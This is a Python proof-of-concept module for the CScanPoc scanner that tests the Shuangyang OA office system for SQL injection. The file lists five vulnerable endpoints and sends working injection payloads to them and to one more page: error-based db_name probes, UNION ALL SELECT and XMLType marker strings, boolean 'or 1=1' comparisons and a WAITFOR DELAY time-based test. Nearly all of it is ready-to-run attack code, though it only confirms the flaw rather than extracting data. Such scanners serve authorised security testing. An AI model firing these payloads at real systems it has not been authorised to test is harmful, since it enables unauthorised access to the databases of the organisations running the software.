# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time


class Vuln(ABVuln):
    vuln_id = 'Shuangyang_0001'  # 平台漏洞编号，留空
    name = '双杨OA系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-05-12'  # 漏洞公布时间
    desc = '''
        双杨OA系统是由上海双杨电脑高科技开发公司打造的一款办公一体化管理软件。
        双杨OA系统多处存在SQL注入漏洞：
        /ObjSwitch/HYTZ.aspx?userid=1
        /RCMANAGE_New/rcgl.aspx?UID=1
        /Personnel/VacationComputation.aspx?id=1
        /Office_Supplies/Goods_Main.aspx?type=1&info_id=1
        /FormBuilder/yjzxList.aspx?id=1
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0113260'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '双杨OA系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fe3cb4a3-3356-47bb-a6a6-ed98f9a1c3c2'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2015-0113260
            hh = hackhttp.hackhttp()
            payloads = [
                '/ObjSwitch/HYTZ.aspx?userid=1',
                '/RCMANAGE_New/rcgl.aspx?UID=1',
                '/Personnel/VacationComputation.aspx?id=1',
                '/Office_Supplies/Goods_Main.aspx?type=1&info_id=1',
                '/FormBuilder/yjzxList.aspx?id=1'
            ]
            getdatas = [
                '%20and%20db_name%281%29%3E1',
                '%20AND%208929%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288929%3D8929%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29'
            ]
            for payload in payloads:
                for getdata in getdatas:
                    url = self.target + payload
                    code, head, res, errcode, _ = hh.http(url + getdata)
                    if 'master' in res or 'qxzzq1qxxbq' in res:
                        #security_hole(url + "  :found sql Injection")
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                            target=self.target, name=self.vuln.name, url=url))

            payload = '/FormBuilder/PrintFormList.aspx?file_id=1'
            getdata = '%29%20UNION%20ALL%20SELECT%20CHAR%28113%29%2bCHAR%28120%29%2bCHAR%28113%29%2bCHAR%28120%29%2bCHAR%28113%29%2bCHAR%2898%29%2bCHAR%2899%29%2bCHAR%2873%29%2bCHAR%28110%29%2bCHAR%2876%29%2bCHAR%2886%29%2bCHAR%2869%29%2bCHAR%2874%29%2bCHAR%28104%29%2bCHAR%2886%29%2bCHAR%28113%29%2bCHAR%28112%29%2bCHAR%28107%29%2bCHAR%28120%29%2bCHAR%28113%29%2CNULL--'
            url = self.target + payload
            code, head, res, errcode, _ = hh.http(url + getdata)
            if 'qxqxqbcInLVEJhVqpkxq' in res:
                #security_hole(url + "  :found sql Injection")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

            payload = '/FormBuilder/PrintFormList.aspx?file_id=1'
            getdata1 = '%29%20or%201%3D1--'
            getdata2 = '%29%20or%201%3D2--'
            url = self.target + payload
            code1, head1, res1, errcode1, _ = hh.http(url + getdata1)
            code2, head2, res2, errcode2, _ = hh.http(url + getdata2)
            m1 = re.findall('option', res1)
            m2 = re.findall('option', res2)
            if m1 != m2:
                #security_hole(url + "  :found sql Injection")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

            payload = '/FormBuilder/yjzxList.aspx?id=1'
            getdata = '%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--'
            url = self.target + payload
            t1 = time.time()
            code1, head, res1, errcode1, _ = hh.http(url)
            t2 = time.time()
            code2, head, res2, errcode2, _ = hh.http(url+getdata)
            t3 = time.time()
            if t3 - 2*t2 + t1 > 3:
                #security_hole(url + "  :found sql Injection")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
